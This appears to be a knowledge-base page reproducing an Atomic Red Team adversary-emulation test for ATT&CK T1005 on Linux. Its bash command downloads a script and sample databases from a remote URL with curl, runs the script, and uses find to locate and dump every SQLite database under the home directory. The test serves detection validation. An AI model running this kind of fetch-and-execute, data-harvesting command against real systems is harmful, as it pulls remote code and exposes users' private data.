---
atomic_guid: "00cbb875-7ae4-4cf1-b638-e543fd825300"
title: "Find and dump sqlite databases (Linux)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1005"
attack_technique_name: "Data from Local System"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1005/T1005.yaml"
build_date: "2026-04-27 19:12:25"
executor: "bash"
aliases:
  - "00cbb875-7ae4-4cf1-b638-e543fd825300"
  - "Find and dump sqlite databases (Linux)"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

An adversary may know/assume that the user of a system uses sqlite databases which contain interest and sensitive data. In this test we download two databases and a sqlite dump script, then run a find command to find & dump the database content.

## ATT&CK Mapping

- [[kb/attack/techniques/T1005-data_from_local_system|T1005: Data from Local System]]

## Input Arguments

### remote_url

- description: url of remote payload
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src

## Dependencies

Check if running on a Debian based machine.

### Prerequisite Check

```untitled
if [ -x "$(command -v sqlite3)" ]; then echo "sqlite3 is installed"; else echo "sqlite3 is NOT installed"; exit 1; fi
if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
if [ -x "$(command -v strings)" ]; then echo "strings is installed"; else echo "strings is NOT installed"; exit 1; fi
```

### Get Prerequisite

```untitled
if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
```

## Executor

- elevation_required: False
- name: bash

### Command

```bash
cd $HOME
curl -O #{remote_url}/art
curl -O #{remote_url}/gta.db
curl -O #{remote_url}/sqlite_dump.sh
chmod +x sqlite_dump.sh
find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
```

### Cleanup

```bash
rm -f $HOME/.art
rm -f $HOME/gta.db
rm -f $HOME/sqlite_dump.sh
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1005/T1005.yaml)
